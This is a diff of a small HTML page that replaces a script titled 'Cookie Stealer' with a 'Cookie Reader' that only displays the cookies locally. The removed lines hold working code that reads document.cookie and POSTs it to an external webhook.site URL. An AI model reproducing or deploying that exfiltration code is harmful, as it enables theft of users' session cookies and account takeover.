@@ -1,32 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Cookie Stealer</title>
+  <title>Cookie Reader</title>
 </head>
 <body>
-  <h1>Checking for cookies...</h1>
+  <h1>Cookies:</h1>
+  <pre id="cookieDisplay"></pre>
+
   <script>
-    const cookies = document.cookie;
-    console.log("Found cookies:", cookies);
-
-    const webhookURL = 'https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2';
-
-    // Send the cookies to the webhook.site URL
-    fetch(webhookURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ cookies: cookies })
-    })
-    .then(response => {
-      console.log("Cookie sent to webhook.site");
-      document.body.innerHTML += "<p>Cookie sent to webhook.site!</p>";
-    })
-    .catch(error => {
-      console.error("Error sending cookie:", error);
-      document.body.innerHTML += "<p>Error sending cookie.</p>";
-    });
+    const allCookies = document.cookie;
+    const cookieDisplay = document.getElementById('cookieDisplay');
+    cookieDisplay.textContent = allCookies;
   </script>
 </body>
 </html>
